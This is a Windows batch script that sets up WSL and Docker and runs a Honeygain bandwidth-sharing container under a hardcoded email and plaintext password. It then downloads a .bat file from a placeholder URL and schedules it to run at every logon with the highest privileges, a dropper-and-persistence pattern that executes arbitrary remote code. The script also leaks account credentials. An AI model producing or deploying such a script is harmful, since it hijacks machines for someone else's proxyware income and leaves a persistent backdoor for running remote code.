@echo off
setlocal enabledelayedexpansion

:: Set WSL 2 as default
wsl --set-default-version 2

:: Install Ubuntu
wsl --install -d Ubuntu

:: Wait for WSL to initialize
echo Waiting for Ubuntu to initialize...
timeout /t 30 /nobreak >nul

:: Update and install Docker dependencies
wsl -e bash -c "sudo apt update && sudo apt install -y ca-certificates curl gnupg"

:: Setup Docker keyring
wsl -e bash -c "sudo install -m 0755 -d /etc/apt/keyrings"
wsl -e bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg"

:: Add Docker repo
wsl -e bash -c "ARCH=$(dpkg --print-architecture) && CODENAME=$(lsb_release -cs) && echo \"deb [arch=$ARCH signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $CODENAME stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null"

:: Install Docker
wsl -e bash -c "sudo apt update && sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin"

:: Add root to Docker group
wsl -e bash -c "sudo usermod -aG docker root"

:: Wait before running Docker
echo Waiting for Docker setup...
timeout /t 10 /nobreak >nul

:: Run Honeygain container
wsl docker run honeygain/honeygain -tou-accept -email ms32-org@outlook.com -pass ms32147258369 -device HGDoc

:: === DOWNLOAD AND SCHEDULE BAT FILE ===
:: Replace with your actual URL
set "BAT_URL=https://example.com/your-script.bat"
set "BAT_NAME=autorun_task.bat"
set "DOWNLOAD_PATH=%~dp0%BAT_NAME%"

:: Download to same directory as this script
powershell -Command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%DOWNLOAD_PATH%'"

:: Create scheduled task to run the downloaded BAT file at user logon
schtasks /create /tn "StartupTask" /tr "\"%DOWNLOAD_PATH%\"" /sc onlogon /rl HIGHEST /f

echo.
echo All tasks completed. You may need to reboot.
pause
